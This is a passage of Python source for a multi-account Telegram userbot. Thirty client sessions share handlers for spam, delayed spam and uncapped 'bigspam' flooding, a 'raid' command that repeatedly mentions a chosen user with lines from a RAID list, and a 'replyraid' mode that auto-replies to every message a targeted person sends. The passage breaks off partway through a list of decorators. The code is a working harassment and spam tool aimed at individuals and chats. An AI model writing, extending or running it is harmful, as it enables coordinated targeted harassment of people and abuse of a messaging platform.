@str1.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.nik"))
async def spam(e):
    usage = "**HAPPY BIRTHDAY FUTU**\n\n【﻿×××𝗦𝗽𝗮𝗺×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
    error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            for _ in range(counter):
                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                await gifspam(e, smex)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            

@str1.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.piku"))
async def spam(e):
    usage = "**HAPPY BIRTHDAY FUTU**\n\n【﻿×××𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        smex = await e.get_reply_message()
        yukki = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
        yukkisexy = yukki[1:]
        if len(yukkisexy) == 2:
            message = str(yukkisexy[1])
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex) 
                await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )


@str1.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.mihiku"))
async def spam(e):
    usage = "**HAPPY BITHDAY FUTU**\n\n【﻿×××𝗕𝗶𝗴𝗦𝗽𝗮𝗺×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex) 
                await asyncio.sleep(0.3)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.3)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )


@str1.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.futu"))
async def spam(e):
    usage = "**HAPPY BITHDAY FUTU**\n\n【﻿×××𝗥𝗮𝗶𝗱×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(yukki[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )




@str1.on(events.NewMessage(incoming=True))
@str2.on(events.NewMessage(incoming=True))
@str3.on(events.NewMessage(incoming=True))
@str4.on(events.NewMessage(incoming=True))
@str5.on(events.NewMessage(incoming=True))
@str6.on(events.NewMessage(incoming=True))
@str7.on(events.NewMessage(incoming=True))
@str8.on(events.NewMessage(incoming=True))
@str9.on(events.NewMessage(incoming=True))
@str10.on(events.NewMessage(incoming=True))
@str11.on(events.NewMessage(incoming=True))
@str12.on(events.NewMessage(incoming=True))
@str13.on(events.NewMessage(incoming=True))
@str14.on(events.NewMessage(incoming=True))
@str15.on(events.NewMessage(incoming=True))
@str16.on(events.NewMessage(incoming=True))
@str17.on(events.NewMessage(incoming=True))
@str18.on(events.NewMessage(incoming=True))
@str19.on(events.NewMessage(incoming=True))
@str20.on(events.NewMessage(incoming=True))
@str21.on(events.NewMessage(incoming=True))
@str22.on(events.NewMessage(incoming=True))
@str23.on(events.NewMessage(incoming=True))
@str24.on(events.NewMessage(incoming=True))
@str25.on(events.NewMessage(incoming=True))
@str26.on(events.NewMessage(incoming=True))
@str27.on(events.NewMessage(incoming=True))
@str28.on(events.NewMessage(incoming=True))
@str29.on(events.NewMessage(incoming=True))
@str30.on(events.NewMessage(incoming=True))
async def _(event):
    global que
    queue = que.get(event.sender_id)
    if not queue:
        return
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(0.3)
    async with event.client.action(event.chat_id, "typing"):
        await event.client.send_message(
            entity=event.chat_id,
            message="""{}""".format(random.choice(RRAID)),
            reply_to=event.message.id,
        )           
            
            
@str1.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.yashu"))
async def _(e):
    global que
    usage = "**HAPPY BIRTHDAY FUTU**\n\n【﻿×××𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱×××】\n\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.replyraid <Username of User>\n\n.replyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 11:
            message = str(yukki[0])
            a = await e.client.get_entity(message)
            g = a.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "**HAPPY BIRTHDAY FUTU**"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "**HAPPY BIRTHDAY FUTU**!!\n         **HAPPY BIRTHDAY FUTU**"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

            
@str1.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.hyppo"))
async def _(e):
    global que
    usage = "**HAPPY BIRTHDAY FUTU**\n\n【﻿×××𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱×××】\n【﻿Command :】\n\n.dreplyraid <Username of User>\n\n.dreplyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 12:
            message = str(yukki[0])
            a = await e.client.get_entity(message)
            g = a.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "**HAPPY BIRTHDAY FUTU**"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "**HAPPY BIRTHDAY FUTU**"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
    
       

@str1.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.campus"))
async def alive(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "𝙲𝙷𝙴𝙲𝙺𝙸𝙽𝙶 !!"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"abhi to party shuru hui hai !!!!\n`{ms}` 𝗺𝘀\n         **HAPPY BIRTHDAY FUTU**")
        
        


@str1.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.pototo"))
async def restart(e):
    if e.sender_id in SMEX_USERS:
        text = "【﻿ＲＥＳＴＡＲＴＩＮＧ】!!!\nPʟᴇᴀꜱᴇ Wᴀɪᴛ Tɪʟʟ lᴛ Rᴇʙᴏᴏᴛꜱ..."
        await e.reply(text, parse_mode=None, link_preview=None )
        try:
            await str1.disconnect()
        except Exception as e:
            pass
        try:
            await str2.disconnect()
        except Exception as e:
            pass
        try:
            await str3.disconnect()
        except Exception as e:
            pass
        try:
            await str4.disconnect()
        except Exception as e:
            pass
        try:
            await str5.disconnect()
        except Exception as e:
            pass
        try:
            await str6.disconnect()
        except Exception as e:
            pass
        try:
            await str7.disconnect()
        except Exception as e:
            pass
        try:
            await str8.disconnect()
        except Exception as e:
            pass
        try:
            await str10.disconnect()
        except Exception as e:
            pass
        try:
            await str9.disconnect()
        except Exception as e:
            pass
        try:
            await str11.disconnect()
        except Exception as e:
            pass
        try:
            await str12.disconnect()
        except Exception as e:
            pass
        try:
            await str13.disconnect()
        except Exception as e:
            pass
        try:
            await str14.disconnect()
        except Exception as e:
            pass
        try:
            await str15.disconnect()
        except Exception as e:
            pass
        try:
            await str16.disconnect()
        except Exception as e:
            pass
        try:
            await str17.disconnect()
        except Exception as e:
            pass
        try:
            await str18.disconnect()
        except Exception as e:
            pass
        try:
            await str19.disconnect()
        except Exception as e:
            pass
        try:
            await str20.disconnect()
        except Exception as e:
            pass
        try:
            await str21.disconnect()
        except Exception as e:
            pass
        try:
            await str22.disconnect()
        except Exception as e:
            pass
        try:
            await str23.disconnect()
        except Exception as e:
            pass
        try:
            await str24.disconnect()
        except Exception as e:
            pass
        try:
            await str25.disconnect()
        except Exception as e:
            pass
        try:
            await str26.disconnect()
        except Exception as e:
            pass
        try:
            await str27.disconnect()
        except Exception as e:
            pass
        try:
            await str28.disconnect()
        except Exception as e:
            pass
        try:
            await str29.disconnect()
        except Exception as e:
            pass
        try:
            await str30.disconnect()
        except Exception as e:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()

        
        
        
        
        
@str1.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
